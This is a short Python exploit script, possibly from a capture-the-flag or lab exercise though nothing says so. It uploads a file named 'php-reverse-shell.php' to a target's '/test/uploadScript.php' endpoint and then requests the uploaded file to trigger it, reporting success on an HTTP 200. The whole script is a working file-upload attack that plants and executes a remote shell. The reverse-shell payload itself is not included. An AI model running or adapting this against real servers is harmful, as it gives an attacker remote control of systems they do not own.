import sys
import requests
import os

def cmd_args(func):
    def wrapper():
        return func(sys.argv[1], sys.argv[2])

    return wrapper

@cmd_args
def run(ip=None, _id=None):
	files = {'filename': open('php-reverse-shell.php', 'rb')}
	response = requests.post(f"http://{ip}/test/uploadScript.php", files=files)

	get = requests.get(f"http://{ip}/test/upload/php-reverse-shell.php")

	if get.status_code == 200:
		return 1
	else: return 0


print(run())